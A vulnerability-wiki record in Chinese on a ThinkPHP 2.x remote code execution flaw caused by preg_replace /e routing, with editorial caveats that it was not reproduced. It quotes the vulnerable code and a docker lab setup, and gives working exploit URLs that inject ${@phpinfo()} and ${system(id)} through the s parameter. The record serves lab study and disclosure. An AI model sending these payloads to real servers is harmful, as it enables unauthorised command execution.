---
version: ""
source: "Threekiii/Vulnerability-Wiki"
product: "ThinkPHP / 路由 preg_replace /e"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "$res = preg_replace('@(\\w+)'.$depr.'([^'.$depr.'\\/]+)@e', '$var[\\'\\\\1\\']='\\\\2';'"
title: "ThinkPHP-2.x-任意代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：2.x及3.0 Lite，实验2.1；依赖支持/e的旧PHP"
side_effects: "未执行；本文需注意的操作影响：范围边界：这是 ThinkPHP 2.x 的旧机制，不能与 5.x 控制器反射或 Request 方法覆盖合并。原结果位置空白、环境未固定，phpinfo/system URL 保留为原文请求，不作成功证据。"
source_status: "unknown"
id: "vw-1d9d64203a6fe35d818e55fc"
entity_id: "ve-1d9d64203a6fe35d818e55fc"
schema_version: "1"
---

## 核对与使用边界

- 范围边界：这是 ThinkPHP 2.x 的旧机制，不能与 5.x 控制器反射或 Request 方法覆盖合并。原结果位置空白、环境未固定，phpinfo/system URL 保留为原文请求，不作成功证据。

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：2.x及3.0 Lite，实验2.1；依赖支持/e的旧PHP

代码与实验材料：有phpinfo及system URL，实验结果位置空白，无compose路径

来源证据范围：Threekiii归档，未提供Vulhub精确目录或上游补丁

- **事实待核（1）**：version字段污染为源码；依据：frontmatter写preg_replace表达式，非版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：旧PHP前提和证据缺失；依据：/e及未引号id依赖历史PHP行为，正文未限定PHP，结果空白。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：环境材料不完整；依据：只有docker-compose up没有配置或目录。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkPHP 2.x 任意代码执行漏洞

## 漏洞描述

ThinkPHP 2.x 版本中，使用 `preg_replace` 的 `/e` 模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。

## 环境搭建

执行如下命令启动 ThinkPHP 2.1 的 Demo 应用：

```bash
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080/Index/Index` 即可查看到默认页面。

## 漏洞复现

直接访问 `http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D` 即可执行 `phpinfo()`：




执行系统命令：

```
http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
```




---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
